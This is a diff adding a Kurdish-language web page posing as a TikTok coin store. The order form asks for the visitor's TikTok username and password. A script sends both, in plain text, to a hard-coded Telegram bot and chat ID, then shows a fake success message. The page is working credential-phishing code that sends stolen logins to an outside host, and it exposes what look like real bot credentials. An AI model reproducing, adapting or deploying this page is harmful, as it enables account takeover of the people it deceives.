@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>داواکردنی کۆینی تیک تۆک</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin: 20px 0 30px;
+        }
+
+        header h1 {
+            font-size: 26px;
+        }
+
+        header h1 span {
+            color: #ff0050;
+        }
+
+        .coins-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            width: 100%;
+            max-width: 800px;
+        }
+
+        .coin-card {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .coin-card:hover {
+            border-color: #00f2fe;
+        }
+
+        .coin-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+
+        .coin-amount {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .buy-btn {
+            background: linear-gradient(45deg, #ff0050, #00f2fe);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        /* Modal Form */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .order-box {
+            background: #1e1e1e;
+            padding: 25px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            left: 15px;
+            background: none;
+            border: none;
+            color: #aaa;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .input-group {
+            margin: 15px 0;
+            text-align: right;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #ccc;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #444;
+            background: #2a2a2a;
+            color: #fff;
+            outline: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .status-msg {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>داواکردنی کۆینی <span>TikTok</span></h1>
+        <p style="color: #888; font-size: 14px; margin-top: 5px;">پاکێجێک هەڵبژێرە بۆ ناردنی داواکاری</p>
+    </header>
+
+    <div class="coins-container">
+        <div class="coin-card" onclick="openOrderModal('70 Coins')">
+            <div class="coin-icon">🪙</div>
+            <div class="coin-amount">70 Coins</div>
+            <button class="buy-btn">داواکردن</button>
+        </div>
+
+        <div class="coin-card" onclick="openOrderModal('350 Coins')">
+            <div class="coin-icon">🪙</div>
+            <div class="coin-amount">350 Coins</div>
+            <button class="buy-btn">داواکردن</button>
+        </div>
+
+        <div class="coin-card" onclick="openOrderModal('700 Coins')">
+            <div class="coin-icon">🪙</div>
+            <div class="coin-amount">700 Coins</div>
+            <button class="buy-btn">داواکردن</button>
+        </div>
+    </div>
+
+    <!-- Modal Form -->
+    <div class="modal-overlay" id="orderModal">
+        <div class="order-box">
+            <button class="close-btn" onclick="closeOrderModal()">&times;</button>
+            <h3>تەواوکردنی داواکاری</h3>
+            <p id="selectedPackage" style="color: #ff0050; margin-top: 5px; font-weight: bold;"></p>
+
+            <form id="tgForm" onsubmit="sendToTelegram(event)">
+                <!-- خانەی یەکەم: ناوی بەکارهێنەر -->
+                <div class="input-group">
+                    <label for="username">ناوی بەکارهێنەر (TikTok Username):</label>
+                    <input type="text" id="username" placeholder="@example" required>
+                </div>
+
+                <!-- 🔑 خانەی دووەم: پاسوۆرد -->
+                <div class="input-group">
+                    <label for="password">پاسوۆرد (Password):</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+
+                <button type="submit" class="submit-btn">ناردنی داواکاری</button>
+            </form>
+            <div id="status" class="status-msg"></div>
+        </div>
+    </div>
+
+    <script>
+        let currentPackage = "";
+
+        const TELEGRAM_BOT_TOKEN = "8386195848:AAFWNzCxjz4ep3BBmRHqikqRZigLGg07B64";
+        const TELEGRAM_CHAT_ID = "6648131751";
+
+        function openOrderModal(packageName) {
+            currentPackage = packageName;
+            document.getElementById('selectedPackage').innerText = packageName;
+            document.getElementById('orderModal').style.display = 'flex';
+            document.getElementById('status').innerText = '';
+        }
+
+        function closeOrderModal() {
+            document.getElementById('orderModal').style.display = 'none';
+        }
+
+        async function sendToTelegram(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            // 🔑 وەرگرتنی پاسوۆردەکە
+            const password = document.getElementById('password').value;
+            
+            const statusDiv = document.getElementById('status');
+
+            statusDiv.style.color = "#ffc107";
+            statusDiv.innerText = "دەنێردرێت...";
+
+            // 🔑 زیادکردنی پاسوۆرد بۆ پەیامی تەلەگرامەکە
+            const message = `🛒 داواکاریی نوێ:\n👤 Username: ${username}\n🔑 Password: ${password}\n💎 Package: ${currentPackage}`;
+            const encodedMessage = encodeURIComponent(message);
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'GET'
+                });
+
+                if (response.ok) {
+                    statusDiv.style.color = "#25d366";
+                    statusDiv.innerText = "داواکارییەکەت بە سەرکەوتوویی نێردرا!";
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = ''; // پاککردنەوەی خانەی پاسوۆردەکە
+                    setTimeout(closeOrderModal, 2000);
+                } else {
+                    statusDiv.style.color = "#ff0050";
+                    statusDiv.innerText = "کێشەیەک ڕوویدا لە ناردندا.";
+                }
+            } catch (error) {
+                statusDiv.style.color = "#ff0050";
+                statusDiv.innerText = "هەڵەیەک لە پەیوەندیدا ڕوویدا.";
+            }
+        }
+    </script>
+</body>
+</html>
